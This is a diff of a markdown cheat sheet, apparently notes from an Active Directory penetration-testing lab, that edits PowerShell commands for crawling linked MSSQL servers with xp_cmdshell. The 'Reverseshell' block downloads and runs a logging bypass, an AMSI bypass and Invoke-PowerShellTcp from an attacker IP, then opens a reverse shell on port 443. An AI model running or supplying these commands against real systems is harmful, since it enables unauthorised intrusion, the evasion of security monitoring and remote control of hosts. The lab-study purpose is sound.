@@ -76,12 +76,12 @@ select * from openquery("dcorp-sql1",'select * from openquery("dcorp-mgmt",''sel
 
 Run commands using crawler
 ```powershell
-Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "execmaster..xp_cmdshell 'cmd /c set username'" -QueryTarget eu-sql
+Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'cmd /c set username'" -QueryTarget eu-sql
 ```
 
 Reverseshell
 ```powershell
-Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec  master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://172.16.100.X/sbloggingbypass.txt);iex (iwr -UseBasicParsing  http://172.16.100.X/amsibypass.txt);iex (iwr -UseBasicParsing http://172.16.100.X/Invoke-PowerShellTcpEx.ps1)"''' -QueryTarget eu-sqlx
+Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://172.16.100.48/sbloggingbypass.txt); iex (iwr -UseBasicParsing http://172.16.100.48/amsibypass.txt); iex (iwr http://172.16.100.48/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.48 -Port 443"''' -QueryTarget eu-sql35
 ```
 
 Manual
